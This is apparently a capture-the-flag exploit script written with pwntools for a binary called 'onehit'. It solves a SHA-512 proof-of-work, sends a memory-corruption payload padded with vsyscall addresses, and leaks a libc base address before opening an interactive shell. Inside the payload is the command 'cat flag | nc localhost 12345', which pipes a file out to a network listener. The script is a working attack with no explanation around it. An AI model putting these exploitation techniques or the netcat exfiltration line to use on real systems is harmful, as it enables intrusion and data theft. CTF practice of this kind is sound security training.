#!/usr/bin/env python
from pwn import *
import re
import hashlib

def solve(chal, prefix):
    for ans in range(10000000):
        if hashlib.sha512(chal + str(ans)).hexdigest().startswith(prefix):
            return ans
    print 'Not found'
    exit(0)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./onehit', env = {'LD_PRELOAD': './libc-2.27.so'})
    else:
        s = remote('pwn03.grandprix.whitehatvn.com', 2023)

    s.recvuntil('sha512(')
    chal, prefix = re.match(r'"(.*)" \+ interger\) = 0x(.*)...', s.recvline(False)).groups()
    s.sendafter('interger = ', str(solve(chal, prefix)) + '\x7f' * 0xe0)
    s.sendafter('ls -al?\n', 'N0\0')
    s.sendafter('/bin/sh\n', '\0')

    payload = ''
    payload += '\0' * 0x8f
    payload += 'cat flag | nc localhost 12345'
    payload = payload.ljust(0xe8, '\0')
    payload += p64(0xffffffffff600000) * 20
    payload += '\x3a'
    s.sendafter('available\n', payload)
    s.recvuntil('Echo machine: ')
    s.recv(0xe8 + 0xf0)
    libc_base = u64(s.recv(8)) - 0x21b97
    log.info('libc base: %#x' % libc_base)

    s.interactive()
